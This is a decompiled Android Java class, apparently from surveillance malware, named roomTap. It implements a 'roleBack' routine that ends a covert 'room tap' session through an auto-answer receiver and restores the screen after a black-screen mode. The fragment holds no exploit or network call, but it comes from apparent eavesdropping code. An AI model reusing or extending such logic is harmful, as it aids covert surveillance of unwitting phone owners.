package com.network.android.roomTap;

import android.content.Context;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class g implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f119a;

    g(Context context) {
        this.f119a = context;
    }

    public final void run() {
        try {
            a.a("roleBack start, should turn screen on:" + k.b);
            if (AutoAnswerReceiver.g.isLocked()) {
                a.a("roleBack already running (locked). returning...");
                return;
            }
            a.a("roleBack setting shouldTurnScreenOnNextTimeItIsTurnedOnByUser to true");
            k.c = true;
            AutoAnswerReceiver.a(this.f119a, new Long(60000));
            if (!AutoAnswerReceiver.a()) {
                a.a("roleBack isRoomTap is false. returning");
                return;
            }
            a.a("roleBack: locking");
            if (!AutoAnswerReceiver.g.tryLock()) {
                a.a("roleBack already running (locked). returning...");
                return;
            }
            AutoAnswerReceiver.a(false);
            a.a("roleBack setting room tap false");
            if (k.b) {
                k.b();
                a.a("roleback shouldTurnScreenOnAfterTapIsOver is true. calling turnScreenOnForLimitedTime");
                k.a(this.f119a, BlackScreen.b());
                k.b = false;
            }
            AutoAnswerReceiver.f(this.f119a);
            a.a("roleBack unlocking lock");
            AutoAnswerReceiver.g.unlock();
        } catch (Exception e) {
            a.a("roleBack Exception- " + e.getMessage(), e);
        }
    }
}
